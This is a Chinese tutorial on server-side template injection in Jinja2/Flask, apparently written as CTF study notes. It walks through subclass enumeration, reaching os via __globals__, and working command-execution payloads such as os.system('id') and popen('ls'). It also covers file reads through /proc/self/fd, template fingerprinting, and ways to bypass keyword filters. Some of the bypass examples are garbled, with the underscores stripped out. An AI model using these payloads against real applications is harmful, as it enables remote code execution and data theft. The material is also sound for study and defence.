#### 构建payload

**如何选择subclasses返回的类**

通常需要找到以下类型的类：

- **`subprocess.Popen`**：用于执行系统命令。
- **`os._wrap_close`**：可以通过`__init__`或`__globals__`访问`os`模块，进而执行命令。
- **`warnings.catch_warnings`**：可以通过`__init__`或`__globals__`访问`os`模块。
- **其他危险类**：任何可以访问`os`模块或执行代码的类。

有这些基本就是能用的

手动查找索引可能比较繁琐，因此可以使用自动化工具或脚本来查找目标类的索引，一个简单的py脚本实例：

```
# 查找 subprocess.Popen 的索引
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    if 'Popen' in str(cls):
        print(f"Index: {i}, Class: {cls}")
```

运行结果类似于

```
Index: 216, Class: <class 'subprocess.Popen'>
```

以下是一些常见类的索引（仅供参考，具体值可能因环境不同而变化）：

- **`subprocess.Popen`**：通常在200-300之间。
- **`os._wrap_close`**：通常在100-200之间。
- **`warnings.catch_warnings`**：通常在100-200之间。



**找到可用的类后，如何找到该类中可用的方法**：

1. **使用 `dir()` 函数列出方法**

- `dir()` 是 Python 的内置函数，可以列出对象的所有属性和方法。
- 在 SSTI 中，可以通过注入 `{{ dir(类) }}` 来列出类的方法。

 **示例**

python

复制

```
{{ ''.__class__.__base__.__subclasses__()[X].__dict__ }}
```

- 将 `X` 替换为目标类的索引。
- 返回的结果会显示类的所有方法和属性。

------

2. **检查 `__dict__` 属性**

- `__dict__` 是 Python 类的属性，返回类的命名空间（包括所有属性和方法）。
- 通过检查 `__dict__`，可以找到可用的方法。

 **示例**

python

复制

```
{{ ''.__class__.__base__.__subclasses__()[X].__dict__ }}
```

- 返回的结果会显示类的所有方法和属性。

------

3. **使用 `help()` 函数查看方法文档**

- `help()` 是 Python 的内置函数，可以查看类或方法的文档。
- 在 SSTI 中，可以通过注入 `{{ help(类) }}` 来查看类的文档。

 **示例**

python

复制

```
{{ help(''.__class__.__base__.__subclasses__()[X]) }}
```

- 返回的结果会显示类的详细文档，包括方法的使用说明。

------

4. **查找危险方法**

在 SSTI 攻击中，通常需要查找以下类型的方法：

- **执行代码的方法**：如 `__init__`、`__globals__`、`__builtins__`。
- **文件操作的方法**：如 `open`、`read`、`write`。
- **系统命令执行的方法**：如 `subprocess.Popen`、`os.system`。

 **常见危险方法**

- **`__init__`**：类的构造函数，可能包含危险操作。
- **`__globals__`**：返回函数的全局命名空间，可能包含危险模块（如 `os`、`subprocess`）。
- **`__builtins__`**：包含 Python 的内置函数（如 `eval`、`exec`）。
- **`get_data`**：某些类（如 `zipimport.zipimporter`）的方法，可以读取文件。

------

5. **动态调用方法**

找到目标方法后，可以通过以下方式调用：

- **直接调用**：如果方法不需要参数，可以直接调用。
- **传递参数**：如果方法需要参数，可以通过注入传递参数。

 **示例 1：调用 `__globals__`**

python

复制

```
{{ ''.__class__.__base__.__subclasses__()[X].__init__.__globals__ }}
```

- 返回的结果会显示 `__init__` 方法的全局命名空间。

 **示例 2：调用 `os.system`**

python

复制

```
{{ ''.__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].system('id') }}
```

- 通过 `__globals__` 访问 `os` 模块，并调用 `system` 方法执行系统命令。

------

6. **自动化工具**

手动查找方法可能比较繁琐，可以使用自动化工具或脚本来查找目标方法。

 **示例脚本**

python

复制

```
# 查找目标类的方法
target_class = ''.__class__.__base__.__subclasses__()[X]
for attr in dir(target_class):
    print(attr)
```



**有时选中一个可用的类，怎么知道其中有没有某一个方法，有下面办法**：（这里以找`get_data`方法为例）

​	1. **查阅Python官方文档**

- Python官方文档提供了所有标准库类的详细说明，包括类的方法和属性。

- 例如，`zipimport.zipimporter`类的文档可以在[Python官方文档](https://docs.python.org/3/library/zipimport.html)中找到，其中明确提到了`get_data`方法。

	2. **使用Python交互式环境**

	

	在本地Python环境中，可以通过交互式命令行（如`python`或`ipython`）动态检查类的属性和方法。

	**步骤 1：导入目标类**

	python

	复制

	```
	from zipimport import zipimporter
	```

	 **步骤 2：检查类的方法**

	使用`dir()`函数列出类的所有属性和方法：

	python

	复制

	```
	print(dir(zipimporter))
	```

	输出结果可能类似于：

	python

	复制

	```
	['__class__', '__delattr__', '__dict__', '__dir__', ..., 'get_data', ...]
	```

	如果`get_data`在列表中，说明该类有`get_data`方法。

	 **步骤 3：查看方法的详细信息**

	使用`help()`函数查看方法的详细信息：

	python

	复制

	```
	help(zipimporter.get_data)
	```

	输出结果会显示方法的签名和功能描述。

	------

	3. **动态查找`get_data`方法**

	在SSTI漏洞利用中，可以通过动态查找的方式确定某个类是否有`get_data`方法。

	- **步骤 1：获取所有子类**

	通过`subclasses`获取所有继承自`object`的子类：

	python

	复制

	```
	{{ ''.__class__.__base__.__subclasses__() }}
	```

	- **步骤 2：遍历子类并检查方法**

	通过遍历子类列表，检查每个类是否有`get_data`方法。例如：

	python

	复制

	```
	{% for subclass in ''.__class__.__base__.__subclasses__() %}
	  {% if 'get_data' in subclass.__dict__ %}
	    {{ subclass }}
	  {% endif %}
	{% endfor %}
	```

	如果某个类有`get_data`方法，它会被输出。

	------

	4. **利用`__dict__`属性**

	- `__dict__`是Python类的一个属性，返回类的命名空间（包括所有属性和方法）。
	- 可以通过检查`__dict__`来确定类是否有`get_data`方法。

	例如：

	python

	复制

	```
	{{ ''.__class__.__base__.__subclasses__()[94].__dict__ }}
	```

	如果输出中包含`'get_data': <function ...>`，说明该类有`get_data`方法。

	------

	5. **利用`hasattr`函数**

	- `hasattr`是Python的内置函数，用于检查对象是否有某个属性或方法。
	- 在SSTI中，可以通过`hasattr`动态检查类是否有`get_data`方法。

	例如：

	python

	复制

	```
	{{ ''.__class__.__base__.__subclasses__()[94]|attr('get_data') }}
	```

	如果返回结果不是`None`，说明该类有`get_data`方法。





#### 魔法方法

```
__class__            类的一个内置属性，表示实例对象的类。
 
__base__             类型对象的直接基类
 
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
 
__mro__              method resolution order，即解析方法调用的顺序；此属性是由类组成的元            组，在方法解析期间会基于它来查找基类。
 
__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。
 
__init__             初始化类，返回的类型是function
 
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
 
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
 
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
 
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
 
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
 
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
 
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
 
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
 
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
 
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
 
current_app          应用上下文，一个全局变量。
 
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
 
request.args.x1   	 get传参
 
request.values.x1 	 所有参数
 
request.cookies      cookies参数
 
request.headers      请求头参数
 
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
 
request.data  		 post传参	(Content-Type:a/b)
 
request.json		 post传json  (Content-Type: application/json)
 
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
 
g                    {{g}}得到<flask.g of 'flask_ssti'>
```



**不知道有什么现成的类，因此我们可以直接使用下面这些来直接获取对应的类**：

```
''.__class__
().__class__
[].__class__
"".__class__
{}.__class__
```

*ps：这些后面直接加`__base__`可以拿到object类*



#### 模板判断

```
Twig{{7*'7'}}结果49 
jinja2{{7*'7'}}结果为7777777  //jinja2的常见参数是name
smarty7{*comment*}7为77
```



#### 常用过滤器

```
int()：将值转换为int类型；
 
float()：将值转换为float类型；
 
lower()：将字符串转换为小写；
 
upper()：将字符串转换为大写；
 
title()：把值中的每个单词的首字母都转成大写；
 
capitalize()：把变量值的首字母转成大写，其余字母转小写；
 
trim()：截取字符串前面和后面的空白字符；
 
wordcount()：计算一个长字符串中单词的个数；
 
reverse()：字符串反转；
 
replace(value,old,new)： 替换将old替换为new的字符串；
 
truncate(value,length=255,killwords=False)：截取length长度的字符串；
 
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
 
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
 
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
 
list()：将变量列成列表；
 
string()：将变量转换成字符串；
 
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
 
abs()：返回一个数值的绝对值；
 
first()：返回一个序列的第一个元素；
 
last()：返回一个序列的最后一个元素；
 
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
 
length()：返回一个序列或者字典的长度；
 
sum()：返回列表内数值的和；
 
sort()：返回排序后的列表；
 
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
 
length()返回字符串的长度，别名是count
```



#### 一些绕过方法

1.过滤[]等括号

使用gititem绕过。如原poc {{"".class.bases[0]}}

绕过后{{"".class.bases.getitem(0)}}

2.过滤了subclasses，拼凑法

原poc{{"".class**.**bases[0].subclasses()}}

绕过 {{"".class.bases[0]'subcla'+'sses'}}

3.过滤class

使用session

poc {{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session['__cla'+'ss__'].__mro__[12]}}
```

或者

```
request['__cl'+'ass__'].__mro__[12]}}
```
